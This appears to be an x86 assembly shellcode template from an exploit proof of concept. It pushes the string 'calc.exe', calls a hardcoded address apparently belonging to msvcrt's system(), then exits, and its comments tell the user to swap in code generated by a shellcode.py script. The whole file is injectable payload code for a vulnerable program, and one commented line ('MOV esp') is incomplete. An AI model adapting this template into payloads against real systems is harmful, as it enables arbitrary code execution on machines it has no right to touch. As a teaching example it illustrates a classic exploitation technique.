; Uncomment the folowing code blocks, if the vulnerable program do not load in memory the DDL msvcrt.ddl.

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;XOR  eax, eax
;MOV  ax, 0x7472             ; Term "tr" in hexa
;PUSH eax
;PUSH dword 0x6376736d       ; Term "csvm" in hexa         
;MOV  esp
;CALL ebx
;MOV  ebp, eax
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
XOR  eax, eax
PUSH eax
; This snippet must be replaced by the Assembly code generated by the script shellcode.py
; Execute the command calc.exe
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
PUSH 0x6578652e
PUSH 0x636c6163
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
MOV  EDI,ESP
PUSH EDI
MOV  EAX, 0x77C293C7
CALL EAX
xor eax, eax
push eax
mov eax, 0x7C81D20A
call eax
